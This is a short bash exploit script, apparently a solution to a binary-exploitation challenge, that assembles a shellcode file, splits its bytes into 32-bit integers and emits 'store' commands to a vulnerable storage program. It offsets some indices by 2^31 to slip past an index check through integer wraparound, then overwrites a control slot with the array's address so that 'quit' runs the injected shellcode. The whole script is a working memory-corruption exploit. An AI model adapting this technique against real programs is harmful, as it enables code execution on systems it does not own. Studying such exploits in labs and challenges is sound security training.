#!/bin/bash

if [[ -z $1 ]]; then
    echo "Please provide the address of the storage array in decimal (read at index -9)"
    exit
fi

numbers=$(nasm -f elf32 shellcode.asm -o shellcode.o && objcopy -O binary -j .text shellcode.o /proc/self/fd/1 | hexdump -ve '1/4 " %u"')

read -ra nums_array <<< "$numbers"

for i in "${!nums_array[@]}"; do
    echo "store"

    echo "${nums_array[$i]}"

    if (( i % 3 == 0 )); then
        echo "$((i + 2147483648))"
    else
        echo "$i"
    fi
done

echo "store"
echo "$1"
echo "$((114 + 2147483648))"
echo "quit"
